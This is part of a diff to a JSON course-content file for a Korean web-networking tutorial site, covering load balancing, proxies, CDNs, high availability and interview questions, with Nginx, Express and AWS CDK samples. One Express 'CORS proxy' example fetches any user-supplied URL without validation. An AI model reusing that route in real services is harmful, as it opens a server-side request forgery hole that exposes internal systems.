+        "content": "### Critical Rendering Path 최적화\n\n```\n1. CSS를 <head>에\n   └── 빠른 CSSOM 생성\n\n2. JS를 </body> 앞에 또는 defer\n   └── DOM 파싱 차단 방지\n\n3. 중요 CSS 인라인\n   └── 외부 파일 로드 대기 없음\n\n4. 불필요한 CSS 제거\n   └── CSSOM 생성 시간 단축\n```\n\n### 성능 측정 도구\n\n```\nChrome DevTools:\n├── Performance 탭: 렌더링 분석\n├── Lighthouse: 전체 성능 점수\n└── Rendering 탭: Paint 영역 표시\n\n핵심 지표:\n├── FCP (First Contentful Paint)\n├── LCP (Largest Contentful Paint)\n├── CLS (Cumulative Layout Shift)\n└── FID (First Input Delay)\n```\n\n### Reflow 유발 속성\n\n```\n피해야 할 속성:\n├── width, height\n├── margin, padding\n├── top, left, right, bottom\n├── font-size, font-family\n└── display\n\n선호할 속성:\n├── transform\n├── opacity\n└── GPU 가속 속성\n```\n\n### 최적화 체크리스트\n\n```\n□ CSS는 head에\n□ JS는 defer 또는 body 끝에\n□ 이미지 lazy loading\n□ CSS 애니메이션은 transform 사용\n□ Layout Thrashing 방지\n□ will-change 적절히 사용\n□ 불필요한 DOM 조작 최소화\n```"
+      }
+    ]
+  },
+  "08_고급/load-balancing": {
+    "id": "08_고급/load-balancing",
+    "title": "로드 밸런싱",
+    "category": "network",
+    "subCategory": "08_고급",
+    "language": "Python",
+    "description": "로드 밸런싱의 개념과 알고리즘을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "⚖️ 로드 밸런싱이란?",
+        "content": "## ⚖️ 한 줄 요약\n> **트래픽 분산 담당** - 요청을 여러 서버에 골고루 나눠줘요!\n\n---\n\n## 💡 왜 필요한가?\n\n### 문제 상황:\n```\n서버 1대에 10만 명 접속\n├── 서버 과부하\n├── 응답 느림\n└── 서버 다운! 😱\n```\n\n### 로드 밸런서로 해결:\n```\n        ┌─────────────┐\n        │로드 밸런서   │\n        └──────┬──────┘\n               │\n    ┌──────────┼──────────┐\n    │          │          │\n┌───▼───┐ ┌───▼───┐ ┌───▼───┐\n│서버 1  │ │서버 2  │ │서버 3  │\n└───────┘ └───────┘ └───────┘\n\n10만 명 ÷ 3 = 서버당 3.3만 명\n→ 안정적인 서비스! ✅\n```\n\n---\n\n## 🎯 로드 밸런싱 알고리즘\n\n### 1. Round Robin (라운드 로빈)\n```\n순서대로 돌아가며 배분\n\n요청1 → 서버1\n요청2 → 서버2\n요청3 → 서버3\n요청4 → 서버1 (다시)\n...\n\n장점: 간단\n단점: 서버 성능 차이 무시\n```\n\n### 2. Weighted Round Robin\n```\n가중치에 따라 배분\n\n서버1 (가중치 3): ●●●\n서버2 (가중치 2): ●●\n서버3 (가중치 1): ●\n\n→ 성능 좋은 서버에 더 많이!\n```\n\n### 3. Least Connections\n```\n현재 연결이 가장 적은 서버로\n\n서버1: 100개 연결\n서버2: 50개 연결  ← 여기로!\n서버3: 80개 연결\n```\n\n### 4. IP Hash\n```\n클라이언트 IP로 서버 결정\n\nhash(192.168.0.1) % 3 = 1\n→ 항상 서버1로!\n\n장점: 같은 사용자 = 같은 서버\n     (세션 유지)\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 로드 밸런서 설정",
+        "content": "### Nginx 로드 밸런서\n\n```nginx\n# nginx.conf\nhttp {\n    # 서버 그룹 정의\n    upstream backend {\n        # Round Robin (기본)\n        server 192.168.0.1:3000;\n        server 192.168.0.2:3000;\n        server 192.168.0.3:3000;\n    }\n\n    # Weighted\n    upstream backend_weighted {\n        server 192.168.0.1:3000 weight=3;\n        server 192.168.0.2:3000 weight=2;\n        server 192.168.0.3:3000 weight=1;\n    }\n\n    # Least Connections\n    upstream backend_least {\n        least_conn;\n        server 192.168.0.1:3000;\n        server 192.168.0.2:3000;\n    }\n\n    # IP Hash (세션 유지)\n    upstream backend_hash {\n        ip_hash;\n        server 192.168.0.1:3000;\n        server 192.168.0.2:3000;\n    }\n\n    server {\n        listen 80;\n\n        location / {\n            proxy_pass http://backend;\n            proxy_set_header Host $host;\n            proxy_set_header X-Real-IP $remote_addr;\n        }\n    }\n}\n```\n\n### 헬스 체크\n\n```nginx\nupstream backend {\n    server 192.168.0.1:3000 max_fails=3 fail_timeout=30s;\n    server 192.168.0.2:3000 max_fails=3 fail_timeout=30s;\n    server 192.168.0.3:3000 backup;  # 백업 서버\n}\n\n# 3번 실패하면 30초간 제외\n# backup 서버는 다른 서버 다운 시에만 사용\n```\n\n### AWS ALB (Application Load Balancer)\n\n```javascript\n// AWS CDK 예시\nconst alb = new elbv2.ApplicationLoadBalancer(this, 'ALB', {\n  vpc,\n  internetFacing: true\n});\n\nconst listener = alb.addListener('Listener', {\n  port: 80\n});\n\nconst targetGroup = listener.addTargets('Targets', {\n  port: 3000,\n  targets: [\n    new targets.InstanceTarget(instance1),\n    new targets.InstanceTarget(instance2)\n  ],\n  healthCheck: {\n    path: '/health',\n    interval: Duration.seconds(30)\n  }\n});\n```\n\n### Docker Compose + Nginx\n\n```yaml\n# docker-compose.yml\nversion: '3'\nservices:\n  nginx:\n    image: nginx\n    ports:\n      - \"80:80\"\n    volumes:\n      - ./nginx.conf:/etc/nginx/nginx.conf\n    depends_on:\n      - app1\n      - app2\n      - app3\n\n  app1:\n    build: .\n    expose:\n      - \"3000\"\n\n  app2:\n    build: .\n    expose:\n      - \"3000\"\n\n  app3:\n    build: .\n    expose:\n      - \"3000\"\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 로드 밸런싱 팁",
+        "content": "### L4 vs L7 로드 밸런서\n\n```\nL4 (Transport Layer)\n├── IP/Port 기반\n├── 빠름\n├── 간단한 분산\n└── TCP/UDP 지원\n\nL7 (Application Layer)\n├── HTTP 헤더/URL 기반\n├── 스마트한 분산\n├── SSL 종료\n├── 캐싱 가능\n└── 더 많은 기능\n\n선택:\n├── 단순 분산 → L4\n└── HTTP 기능 필요 → L7\n```\n\n### 세션 유지 전략\n\n```\n1. Sticky Session (IP Hash)\n   └── 같은 사용자 = 같은 서버\n\n2. Session 중앙화 (Redis)\n   └── 어느 서버든 세션 접근 가능\n\n3. Stateless (JWT)\n   └── 세션 서버 불필요\n\n추천: Session 중앙화 또는 JWT\n```\n\n### 헬스 체크 설정\n\n```\n체크 주기: 5~30초\n타임아웃: 2~5초\n임계값: 2~3회 실패 시 제외\n복구 조건: 2~3회 성공 시 복구\n\n엔드포인트 예시:\nGET /health → 200 OK\n└── DB 연결, 캐시 연결 확인\n```\n\n### 클라우드 서비스 비교\n\n```\nAWS:\n├── ALB (L7, HTTP)\n├── NLB (L4, TCP/UDP)\n└── CLB (Classic, 레거시)\n\nGCP:\n├── HTTP(S) Load Balancer\n└── TCP/UDP Load Balancer\n\nAzure:\n├── Application Gateway\n└── Load Balancer\n```"
+      }
+    ]
+  },
+  "08_고급/proxy": {
+    "id": "08_고급/proxy",
+    "title": "프록시",
+    "category": "network",
+    "subCategory": "08_고급",
+    "language": "Python",
+    "description": "프록시 서버의 개념과 종류를 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔀 프록시란?",
+        "content": "## 🔀 한 줄 요약\n> **대리인 서버** - 클라이언트와 서버 사이에서 대신 요청/응답해줘요!\n\n---\n\n## 💡 프록시의 종류\n\n### 1. Forward Proxy (정방향)\n```\n클라이언트를 대신하여 요청\n\n┌────────┐     ┌────────┐     ┌────────┐\n│클라이언트│ ──► │ 프록시  │ ──► │ 서버   │\n└────────┘     └────────┘     └────────┘\n\n사용 사례:\n├── 회사/학교 인터넷 필터링\n├── IP 숨기기\n├── 지역 제한 우회\n└── 캐싱\n```\n\n### 2. Reverse Proxy (역방향)\n```\n서버를 대신하여 응답\n\n┌────────┐     ┌────────┐     ┌────────┐\n│클라이언트│ ──► │ 프록시  │ ──► │ 서버   │\n└────────┘     └────────┘     └────────┘\n\n사용 사례:\n├── 로드 밸런싱\n├── SSL 종료\n├── 캐싱\n├── 보안 (서버 숨기기)\n└── 압축\n```\n\n---\n\n## 🎯 프록시 역할\n\n### Forward Proxy:\n```\n회사 내부 직원 → 프록시 → 인터넷\n\n1. 접근 제어\n   └── \"유튜브 차단\"\n\n2. 캐싱\n   └── 자주 요청되는 콘텐츠 저장\n\n3. 익명성\n   └── 실제 IP 숨김\n\n4. 로깅\n   └── 누가 뭘 접속했는지 기록\n```\n\n### Reverse Proxy:\n```\n인터넷 사용자 → 프록시 → 내부 서버\n\n1. 로드 밸런싱\n   └── 여러 서버로 분산\n\n2. SSL 종료\n   └── HTTPS 처리 후 HTTP로 전달\n\n3. 캐싱\n   └── 정적 파일 캐싱\n\n4. 보안\n   └── WAF, DDoS 방어\n   └── 실제 서버 IP 숨김\n\n5. 압축\n   └── gzip 등 응답 압축\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 프록시 설정",
+        "content": "### Nginx Reverse Proxy\n\n```nginx\n# 기본 리버스 프록시\nserver {\n    listen 80;\n    server_name myapp.com;\n\n    location / {\n        proxy_pass http://localhost:3000;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header X-Forwarded-Proto $scheme;\n    }\n}\n\n# SSL 종료 + 프록시\nserver {\n    listen 443 ssl;\n    server_name myapp.com;\n\n    ssl_certificate /etc/ssl/cert.pem;\n    ssl_certificate_key /etc/ssl/key.pem;\n\n    location / {\n        proxy_pass http://localhost:3000;  # 내부는 HTTP\n    }\n}\n\n# 캐싱 설정\nlocation ~* \\.(jpg|css|js)$ {\n    proxy_pass http://localhost:3000;\n    proxy_cache my_cache;\n    proxy_cache_valid 200 1d;\n    add_header X-Cache-Status $upstream_cache_status;\n}\n```\n\n### Node.js 프록시 (http-proxy-middleware)\n\n```javascript\nconst { createProxyMiddleware } = require('http-proxy-middleware');\n\n// API 요청을 백엔드로 프록시\napp.use('/api', createProxyMiddleware({\n  target: 'http://backend:5000',\n  changeOrigin: true,\n  pathRewrite: { '^/api': '' }\n}));\n\n// WebSocket 프록시\napp.use('/socket.io', createProxyMiddleware({\n  target: 'http://backend:5000',\n  ws: true\n}));\n```\n\n### 개발 환경 프록시 (Vite)\n\n```javascript\n// vite.config.js\nexport default {\n  server: {\n    proxy: {\n      '/api': {\n        target: 'http://localhost:5000',\n        changeOrigin: true\n      },\n      '/socket.io': {\n        target: 'ws://localhost:5000',\n        ws: true\n      }\n    }\n  }\n}\n```\n\n### CORS 프록시 (Express)\n\n```javascript\n// CORS 문제 우회용 프록시\napp.get('/proxy', async (req, res) => {\n  const { url } = req.query;\n\n  const response = await fetch(url);\n  const data = await response.text();\n\n  res.send(data);\n});\n\n// 클라이언트\nfetch('/proxy?url=https://api.example.com/data')\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 프록시 활용 팁",
+        "content": "### 프록시 vs 로드 밸런서 vs CDN\n\n```\n프록시:\n├── 요청 중개\n├── 캐싱, 필터링, 변환\n└── 단일 목적지도 OK\n\n로드 밸런서:\n├── 트래픽 분산 특화\n├── 여러 서버로 분배\n└── 헬스 체크\n\nCDN:\n├── 콘텐츠 배포 특화\n├── 전세계 엣지 서버\n└── 정적 파일 캐싱\n\n조합:\n사용자 → CDN → 로드밸런서 → 서버\n```\n\n### X-Forwarded-* 헤더\n\n```\n프록시 뒤에서 원본 정보 얻기:\n\nX-Forwarded-For: 클라이언트 IP\nX-Forwarded-Proto: 원본 프로토콜 (http/https)\nX-Forwarded-Host: 원본 호스트\n\n서버에서 확인:\nconst clientIP = req.headers['x-forwarded-for']\n  || req.connection.remoteAddress;\n```\n\n### 보안 고려사항\n\n```\n1. 프록시 헤더 신뢰 설정\n   └── 믿을 수 있는 프록시만 허용\n\n2. 숨김 헤더 제거\n   └── Server, X-Powered-By 등\n\n3. 접근 제어\n   └── 내부 서비스 노출 방지\n\n4. Rate Limiting\n   └── DDoS 방어\n```\n\n### 디버깅 팁\n\n```\n1. curl로 테스트\ncurl -v https://myapp.com\n\n2. 헤더 확인\nX-Cache-Status: HIT/MISS\nX-Proxy-Cache: 캐시 상태\n\n3. 로그 확인\ntail -f /var/log/nginx/access.log\n```"
+      }
+    ]
+  },
+  "08_기타/cdn": {
+    "id": "08_기타/cdn",
+    "title": "CDN",
+    "category": "network",
+    "subCategory": "08_기타",
+    "language": "Python",
+    "description": "Content Delivery Network의 개념을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🌍 CDN이란?",
+        "content": "## 🌍 한 줄 요약\n> **전세계 콘텐츠 배달부** - 가까운 곳에서 빠르게 콘텐츠를 전달해요!\n\n---\n\n## 💡 왜 CDN이 필요한가?\n\n### 문제 상황:\n```\n서버: 미국\n사용자: 한국\n\n한국 ────── 태평양 ────── 미국\n         왕복 200ms 😢\n\n이미지 10개 로드 = 2초 지연!\n```\n\n### CDN으로 해결:\n```\n원본 서버: 미국\nCDN 엣지: 한국\n\n한국 ── CDN 서울 ── 원본(미국)\n       왕복 20ms 😊\n\n이미지가 한국 CDN에 캐시됨!\n```\n\n---\n\n## 🎯 CDN 동작 방식\n\n```\n1. 첫 요청 (Cache MISS)\n┌────────┐     ┌────────┐     ┌────────┐\n│ 한국    │ ──► │CDN 서울│ ──► │원본 미국│\n│ 사용자  │ ◄── │        │ ◄── │        │\n└────────┘     └────────┘     └────────┘\n               (캐시 저장)\n\n2. 이후 요청 (Cache HIT)\n┌────────┐     ┌────────┐\n│ 한국    │ ──► │CDN 서울│\n│ 사용자  │ ◄── │(캐시)  │\n└────────┘     └────────┘\n원본 서버 접근 불필요! ⚡\n```\n\n### CDN 장점:\n```\n1. 속도 향상 ⚡\n   └── 가까운 서버에서 응답\n\n2. 부하 분산 📊\n   └── 원본 서버 트래픽 감소\n\n3. 가용성 📈\n   └── 원본 다운 시에도 캐시 제공\n\n4. 보안 🔒\n   └── DDoS 방어, WAF\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 CDN 설정하기",
+        "content": "### Cloudflare 설정\n\n```\n1. DNS 설정\n   example.com → Cloudflare 네임서버\n\n2. 캐시 규칙\n   ├── 정적 파일: 캐시 (이미지, CSS, JS)\n   ├── API: 캐시 안 함\n   └── HTML: 상황에 따라\n\n3. 페이지 규칙 예시\n   example.com/static/* → 캐시 1달\n   example.com/api/* → 캐시 우회\n```\n\n### 캐시 제어 헤더\n\n```javascript\n// Express에서 캐시 헤더 설정\napp.use('/static', express.static('public', {\n  maxAge: '1y',  // 1년 캐시\n  immutable: true\n}));\n\n// 동적 콘텐츠: 캐시 안 함\napp.get('/api/*', (req, res, next) => {\n  res.set('Cache-Control', 'no-store');\n  next();\n});\n\n// 조건부 캐시 (ETag)\napp.get('/posts/:id', (req, res) => {\n  const post = getPost(req.params.id);\n  const etag = generateETag(post);\n\n  if (req.headers['if-none-match'] === etag) {\n    return res.status(304).end();\n  }\n\n  res.set('ETag', etag);\n  res.json(post);\n});\n```\n\n### 캐시 무효화 (Cache Invalidation)\n\n```javascript\n// 파일명에 해시 포함 (권장)\n// main.abc123.js\n// → 파일 변경 시 새 URL = 새 캐시\n\n// Webpack 설정\noutput: {\n  filename: '[name].[contenthash].js'\n}\n\n// Vite 기본 지원\n// dist/assets/index.a1b2c3d4.js\n\n// API로 캐시 삭제 (Cloudflare)\nfetch('https://api.cloudflare.com/client/v4/zones/{zone}/purge_cache', {\n  method: 'POST',\n  headers: {\n    'Authorization': 'Bearer TOKEN',\n    'Content-Type': 'application/json'\n  },\n  body: JSON.stringify({\n    files: ['https://example.com/style.css']\n  })\n});\n```\n\n### HTML에서 CDN 사용\n\n```html\n<!-- 직접 호스팅 대신 CDN -->\n<script src=\"https://cdn.jsdelivr.net/npm/react@18/umd/react.production.min.js\"></script>\n\n<!-- 자체 CDN -->\n<img src=\"https://cdn.myapp.com/images/logo.png\">\n<link href=\"https://cdn.myapp.com/css/style.css\">\n<script src=\"https://cdn.myapp.com/js/app.js\"></script>\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 CDN 활용 팁",
+        "content": "### CDN 서비스 비교\n\n```\nCloudflare\n├── 무료 플랜 있음\n├── DDoS 방어 강력\n└── 설정 쉬움\n\nAWS CloudFront\n├── AWS 서비스 연동\n├── 세밀한 제어\n└── 종량제\n\nVercel Edge Network\n├── Next.js 최적화\n├── 자동 배포\n└── 무료 tier\n\nFastly\n├── 실시간 캐시 삭제\n├── 엣지 컴퓨팅\n└── 고성능\n```\n\n### 캐시 전략\n\n```\n정적 파일 (이미지, CSS, JS):\n├── 긴 캐시 (1년)\n├── 파일명에 해시 포함\n└── immutable 설정\n\nHTML:\n├── 짧은 캐시 또는 no-cache\n├── stale-while-revalidate\n└── 동적 콘텐츠는 캐시 안 함\n\nAPI 응답:\n├── 대부분 캐시 안 함\n├── 공개 데이터만 짧게 캐시\n└── 사용자별 데이터 절대 캐시 X\n```\n\n### Cache-Control 헤더\n\n```\npublic: CDN 캐시 가능\nprivate: 브라우저만 캐시\nno-store: 캐시 금지\nno-cache: 매번 검증\nmax-age=3600: 1시간 캐시\ns-maxage=3600: CDN용 (별도 설정)\nimmutable: 변경 안 됨\nstale-while-revalidate: 백그라운드 갱신\n\n예시:\nCache-Control: public, max-age=31536000, immutable\n```\n\n### 측정 도구\n\n```\n1. WebPageTest\n   └── 전세계 위치에서 속도 측정\n\n2. Chrome DevTools\n   └── Network 탭에서 Cache 상태\n\n3. curl\n   curl -I https://example.com/image.jpg\n   └── 헤더 확인\n\n4. CDN 대시보드\n   └── 히트율, 대역폭 확인\n```"
+      }
+    ]
+  },
+  "08_기타/load-balancer": {
+    "id": "08_기타/load-balancer",
+    "title": "로드 밸런서 심화",
+    "category": "network",
+    "subCategory": "08_기타",
+    "language": "Python",
+    "description": "로드 밸런서 구성과 고가용성을 이해합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🔄 로드 밸런서 심화",
+        "content": "## 🔄 한 줄 요약\n> **고가용성의 핵심** - 서버가 죽어도 서비스는 살아있게!\n\n---\n\n## 💡 고가용성 (High Availability)\n\n### 단일 장애점 제거:\n```\n문제: 로드 밸런서 1대\n├── 로드 밸런서 다운 = 전체 서비스 다운\n└── 단일 장애점 (SPOF)\n\n해결: 로드 밸런서 이중화\n        ┌─────────────────┐\n        │  Virtual IP     │\n        └────────┬────────┘\n            Active│Standby\n        ┌────────┴────────┐\n    ┌───▼───┐        ┌───▼───┐\n    │ LB 1  │◄──────►│ LB 2  │\n    │(Active)│Heartbeat│(Standby)│\n    └───┬───┘        └───┬───┘\n        │                │\n    ┌───▼───┬───┬───▼───┐\n    │서버1   │서버2│서버3   │\n    └───────┴───┴───────┘\n```\n\n### Failover 과정:\n```\n1. LB1이 다운됨\n2. LB2가 감지 (Heartbeat 없음)\n3. LB2가 VIP를 인계받음\n4. 트래픽이 LB2로 전환\n5. 서비스 중단 최소화 (수 초)\n```\n\n---\n\n## 🎯 L4 vs L7 상세 비교\n\n```\n┌──────────────┬───────────────┬───────────────┐\n│              │ L4 (TCP/UDP)  │ L7 (HTTP)     │\n├──────────────┼───────────────┼───────────────┤\n│ 처리 속도     │ 빠름          │ 느림 (파싱)   │\n│ 분산 기준     │ IP, Port      │ URL, 헤더    │\n│ SSL 종료     │ 불가          │ 가능          │\n│ 세션 유지     │ 제한적        │ 쿠키 기반     │\n│ 캐싱         │ 불가          │ 가능          │\n│ 압축         │ 불가          │ 가능          │\n│ 가격         │ 저렴          │ 비쌈          │\n└──────────────┴───────────────┴───────────────┘\n```\n\n### 언제 무엇을 선택?\n\n```\nL4 선택:\n├── 고성능 필요\n├── 비 HTTP 트래픽 (DB, 게임)\n├── 단순 분산\n└── 비용 절감\n\nL7 선택:\n├── URL 기반 라우팅\n├── SSL 종료\n├── A/B 테스트\n├── 인증, 캐싱\n└── 세밀한 제어\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 고급 로드 밸런싱",
+        "content": "### URL 기반 라우팅 (Nginx)\n\n```nginx\nupstream api_servers {\n    server 10.0.0.1:3000;\n    server 10.0.0.2:3000;\n}\n\nupstream web_servers {\n    server 10.0.0.3:3000;\n    server 10.0.0.4:3000;\n}\n\nserver {\n    listen 80;\n\n    # /api/* → API 서버\n    location /api/ {\n        proxy_pass http://api_servers;\n    }\n\n    # /static/* → 웹 서버\n    location /static/ {\n        proxy_pass http://web_servers;\n    }\n\n    # 나머지 → 웹 서버\n    location / {\n        proxy_pass http://web_servers;\n    }\n}\n```\n\n### 세션 유지 (Sticky Session)\n\n```nginx\nupstream backend {\n    ip_hash;  # IP 기반 고정\n    server 10.0.0.1:3000;\n    server 10.0.0.2:3000;\n}\n\n# 또는 쿠키 기반 (Plus 버전)\nupstream backend {\n    sticky cookie srv_id expires=1h;\n    server 10.0.0.1:3000;\n    server 10.0.0.2:3000;\n}\n```\n\n### 헬스 체크 고급 설정\n\n```nginx\nupstream backend {\n    server 10.0.0.1:3000 max_fails=3 fail_timeout=30s;\n    server 10.0.0.2:3000 max_fails=3 fail_timeout=30s;\n    server 10.0.0.3:3000 backup;  # 백업\n    server 10.0.0.4:3000 down;    # 수동으로 제외\n\n    keepalive 32;  # 연결 유지\n}\n\n# 능동적 헬스 체크 (Plus 버전)\nupstream backend {\n    zone backend 64k;\n    server 10.0.0.1:3000;\n\n    health_check interval=5s\n                 fails=3\n                 passes=2\n                 uri=/health\n                 match=healthy;\n}\n\nmatch healthy {\n    status 200;\n    body ~ \"OK\";\n}\n```\n\n### AWS ALB + Target Group\n\n```javascript\n// AWS CDK\nconst alb = new elbv2.ApplicationLoadBalancer(this, 'ALB', {\n  vpc,\n  internetFacing: true\n});\n\nconst apiTarget = new elbv2.ApplicationTargetGroup(this, 'APITarget', {\n  vpc,\n  port: 3000,\n  protocol: elbv2.ApplicationProtocol.HTTP,\n  healthCheck: {\n    path: '/health',\n    healthyThresholdCount: 2,\n    unhealthyThresholdCount: 3\n  }\n});\n\nconst webTarget = new elbv2.ApplicationTargetGroup(this, 'WebTarget', {\n  vpc,\n  port: 3000\n});\n\nconst listener = alb.addListener('Listener', { port: 443 });\n\nlistener.addAction('Route', {\n  action: elbv2.ListenerAction.forward([\n    {\n      targetGroup: apiTarget,\n      conditions: [elbv2.ListenerCondition.pathPatterns(['/api/*'])]\n    },\n    {\n      targetGroup: webTarget  // 기본\n    }\n  ])\n});\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 운영 팁",
+        "content": "### 무중단 배포 전략\n\n```\n1. Rolling Update\n   ├── 서버 하나씩 순차 배포\n   ├── 배포 중 일부 서버만 새 버전\n   └── 간단하지만 롤백 느림\n\n2. Blue-Green\n   ├── 새 환경 전체 배포\n   ├── LB에서 트래픽 전환\n   └── 빠른 롤백 가능\n\n3. Canary\n   ├── 일부 트래픽만 새 버전으로\n   ├── 점진적 확대\n   └── 위험 최소화\n```\n\n### Connection Draining\n\n```\n서버 제거 시:\n1. 새 연결 차단\n2. 기존 연결 완료 대기 (30초)\n3. 타임아웃 후 강제 종료\n4. 서버 제거\n\n설정:\n├── AWS: Deregistration delay\n├── Nginx: upstream 설정\n└── 권장: 30~60초\n```\n\n### 모니터링 지표\n\n```\n필수 지표:\n├── 요청 수 (RPS)\n├── 응답 시간 (Latency)\n├── 에러율 (5xx 비율)\n├── 활성 연결 수\n└── 서버별 부하\n\n알람 설정:\n├── 에러율 > 1%\n├── 응답 시간 > 500ms\n├── 서버 다운\n└── CPU/메모리 임계치\n```\n\n### 보안 설정\n\n```\n1. SSL/TLS\n   └── 인증서 관리, 최신 프로토콜\n\n2. WAF (Web Application Firewall)\n   └── SQL Injection, XSS 방어\n\n3. Rate Limiting\n   └── DDoS, 브루트포스 방어\n\n4. 접근 제어\n   └── IP 화이트리스트/블랙리스트\n\n5. 로깅\n   └── 접근 로그, 에러 로그\n```"
+      }
+    ]
+  },
+  "09_면접/interview-network": {
+    "id": "09_면접/interview-network",
+    "title": "네트워크 면접",
+    "category": "network",
+    "subCategory": "09_면접",
+    "language": "Python",
+    "description": "네트워크 관련 기술 면접을 준비합니다",
+    "isPlaceholder": false,
+    "sections": [
+      {
+        "type": "concept",
+        "title": "🎯 네트워크 면접 총정리",
+        "content": "## 🎯 빈출 주제\n\n### 필수 암기 TOP 10:\n```\n1. HTTP vs HTTPS\n2. TCP vs UDP\n3. REST API란?\n4. 쿠키 vs 세션\n5. JWT란?\n6. CORS란?\n7. WebSocket이란?\n8. OSI 7계층\n9. 3-way / 4-way handshake\n10. DNS 동작 원리\n```\n\n---\n\n## 💬 자주 나오는 질문과 답변\n\n### Q1: HTTP와 HTTPS의 차이?\n```\nA: HTTPS는 HTTP에 SSL/TLS 암호화를 추가한 것입니다.\n\n차이점:\n├── 보안: HTTPS는 데이터 암호화\n├── 포트: HTTP(80), HTTPS(443)\n├── 인증: HTTPS는 SSL 인증서 필요\n└── 성능: HTTPS가 약간 느림 (암호화 비용)\n\n왜 중요한가:\n├── 개인정보 보호\n├── 데이터 무결성\n├── 서버 인증\n└── SEO 가점 (구글)\n```\n\n### Q2: TCP와 UDP의 차이?\n```\nA: TCP는 신뢰성, UDP는 속도 중심입니다.\n\nTCP:\n├── 연결형 (3-way handshake)\n├── 순서 보장\n├── 재전송 (손실 복구)\n└── 웹, 이메일, 파일 전송\n\nUDP:\n├── 비연결형\n├── 순서 미보장\n├── 재전송 없음\n└── 스트리밍, 게임, DNS\n\n비유:\n├── TCP = 등기우편 (확인, 추적)\n└── UDP = 일반우편 (빠름, 확인X)\n```\n\n### Q3: REST API란?\n```\nA: HTTP를 활용한 웹 API 설계 원칙입니다.\n\n핵심 원칙:\n├── 자원 중심 URL (/users, /posts)\n├── HTTP 메서드로 행위 표현\n│   ├── GET: 조회\n│   ├── POST: 생성\n│   ├── PUT/PATCH: 수정\n│   └── DELETE: 삭제\n├── 무상태 (Stateless)\n└── 표준 상태 코드 사용\n\n예시:\nGET /users/1     → 사용자 1 조회\nPOST /users      → 사용자 생성\nPUT /users/1     → 사용자 1 수정\nDELETE /users/1  → 사용자 1 삭제\n```"
+      },
+      {
+        "type": "code",
+        "title": "💻 핵심 개념 코드",
+        "content": "### Q4: 쿠키 vs 세션 차이? (코드로)\n\n```javascript\n// 쿠키: 클라이언트 저장\nres.cookie('theme', 'dark', {\n  maxAge: 86400000,\n  httpOnly: true\n});\n// → 브라우저에 저장, 매 요청 자동 전송\n\n// 세션: 서버 저장\nreq.session.userId = 123;\n// → 서버에 저장, 클라이언트는 세션 ID만 보유\n\n// 비교:\n// 쿠키: 노출 위험, 4KB 제한, 클라이언트 부담\n// 세션: 안전, 용량 무제한, 서버 부담\n```\n\n### Q5: JWT 구조 설명\n\n```javascript\n// JWT = Header.Payload.Signature\n\n// Header\n{ \"alg\": \"HS256\", \"typ\": \"JWT\" }\n\n// Payload (데이터)\n{ \"userId\": 1, \"exp\": 1735689600 }\n\n// Signature (위조 방지)\nHMACSHA256(base64(header) + \".\" + base64(payload), secret)\n\n// 특징:\n// - 서버 저장 불필요 (Stateless)\n// - 암호화 X, 인코딩 O (내용 볼 수 있음)\n// - 서명으로 위변조 검증\n```\n\n### Q6: CORS 해결 방법\n\n```javascript\n// 1. 서버에서 헤더 추가\napp.use(cors({\n  origin: 'https://frontend.com',\n  methods: ['GET', 'POST'],\n  credentials: true\n}));\n\n// 2. 응답 헤더\nAccess-Control-Allow-Origin: https://frontend.com\n\n// CORS가 필요한 이유:\n// - 브라우저 보안 정책 (SOP)\n// - 다른 출처 요청 차단\n// - 서버가 명시적으로 허용해야 함\n```\n\n### Q7: TCP 3-way Handshake\n\n```\n클라이언트              서버\n    │                    │\n    │──── SYN ──────────►│  1. 연결 요청\n    │                    │\n    │◄─── SYN + ACK ─────│  2. 요청 수락 + 확인\n    │                    │\n    │──── ACK ──────────►│  3. 확인\n    │                    │\n    │═══ 연결 완료 ═══════│\n\n왜 3번?\n├── 양방향 통신 확인\n├── 초기 순서 번호 교환\n└── 서로의 수신 능력 확인\n```"
+      },
+      {
+        "type": "tip",
+        "title": "💡 면접 팁",
+        "content": "### 답변 구조 (STAR)\n\n```\nS(상황): 개념 설명\nT(과제): 왜 필요한지\nA(행동): 어떻게 동작하는지\nR(결과): 실제 사용 사례\n\n예시:\n\"HTTPS는... (개념)\n보안이 필요해서... (이유)\nSSL/TLS로 암호화... (동작)\n로그인 페이지 등에 사용... (사례)\"\n```\n\n### 꼬리 질문 대비\n\n```\nQ: \"HTTPS가 느리다고 했는데, 왜 느린가요?\"\nA: \"암호화/복호화 연산 때문입니다.\n    하지만 HTTP/2와 함께 사용하면\n    멀티플렉싱으로 오히려 빨라질 수 있습니다.\"\n\nQ: \"JWT의 단점은?\"\nA: \"토큰 탈취 시 만료까지 유효합니다.\n    해결책으로 Access+Refresh 토큰 조합과\n    짧은 만료 시간을 사용합니다.\"\n```\n\n### 모르는 질문 대처\n\n```\n\"정확히는 모르지만,\n제가 이해한 바로는...\"\n\n\"실무에서 사용해본 적은 없지만,\n개념적으로는...\"\n\n\"관련된 OOO는 알고 있는데,\n그 부분은 더 공부가 필요할 것 같습니다.\"\n```\n\n### 실무 경험 연결\n\n```\n\"이전 프로젝트에서 CORS 문제를 겪었는데,\nNginx 프록시로 해결했습니다.\"\n\n\"채팅 기능 구현 시 WebSocket을 사용했고,\n재연결 로직도 구현했습니다.\"\n\n\"성능 개선을 위해 CDN을 도입하여\n응답 시간을 70% 단축했습니다.\"\n```\n\n### 최신 트렌드 언급\n\n```\n\"HTTP/3와 QUIC 프로토콜\"\n\"gRPC의 장점\"\n\"Edge Computing / CDN\"\n\"Zero Trust 보안 모델\"\n```"
+      }
+    ]
+  },
+  "index": {
